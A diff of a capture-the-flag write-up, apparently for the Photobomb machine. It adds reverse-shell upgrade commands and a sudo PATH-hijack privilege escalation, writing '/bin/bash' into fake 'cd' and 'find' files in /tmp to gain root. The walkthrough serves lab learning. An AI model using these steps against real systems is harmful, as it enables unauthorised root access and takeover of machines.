@@ -66,7 +66,10 @@ Let's URL encode that and inject into the request after setting up a netcat list
 
 <img width="296" alt="image" src="https://user-images.githubusercontent.com/114961392/201584966-32240a26-64f4-471f-983d-e7c15a4be6fb.png">
 
-WOOSHKAH! We have a reverse shell. I will use the usual terminal upgrade technique to get a more stable shell.
+WOOSHKAH! We have a reverse shell. I will use the usual terminal upgrade technique to get a more stable shell.  
+**script /dev/null -c bash  
+ctrl-z  
+stty raw -echo; fg**  
 
 <img width="306" alt="image" src="https://user-images.githubusercontent.com/114961392/201585184-18cd1410-918a-4f56-b8ef-d54ef1864df5.png">
 
@@ -76,4 +79,26 @@ Now that we are in, we can navigate to the user flag.
 
 ## Privilege Escalation
 
-By using the "sudo -l" technique, we can see that we can run /opt/cleanup.sh from root.  
+By using the "sudo -l" technique, we can see that we can run /opt/cleanup.sh script from root.  
+
+<img width="470" alt="image" src="https://user-images.githubusercontent.com/114961392/201787700-eaaebeb9-601b-4d62-88ef-cb0399d4828c.png">
+
+Let's have a look at the script.  
+
+<img width="353" alt="image" src="https://user-images.githubusercontent.com/114961392/201787789-3dec11da-987c-4133-8d19-c49e8db7db83.png">
+
+The script is just moving the contents of the **log/photobomb.log** file and moving it to **log/photobomb.log.old** then clearing the log file to 0 bytes. However, it does not look like it is using absolute path. Let's try take advantage of this. If we add **/bin/bash** to a new **cd** file in **/tmp**, then give read, write and execute permissions to file, then change the **PATH** to **/tmp**, it should work.  
+**echo "/bin/bash" > cd  
+chmod 777 cd  
+sudo PATH=/tmp:$PATH /opt/cleanup.sh**  
+
+<img width="305" alt="image" src="https://user-images.githubusercontent.com/114961392/201790245-133359a7-3e36-42d5-8022-74866bb695d3.png">
+
+Unfortunately it failed. I went back to do a bit more research and found that I should do the same thing with the **find** file as well in case **cd** fails.  
+**echo "/bin/bash" > find  
+chmod 777 find
+sudo PATH=/tmp:$PATH /opt/cleanup.sh**  
+
+<img width="305" alt="image" src="https://user-images.githubusercontent.com/114961392/201790524-f58d7ea0-5503-44c3-b7b7-40a23425908f.png">
+
+WOOSHKAH! It worked. From here we can go ahead and capture root flag.
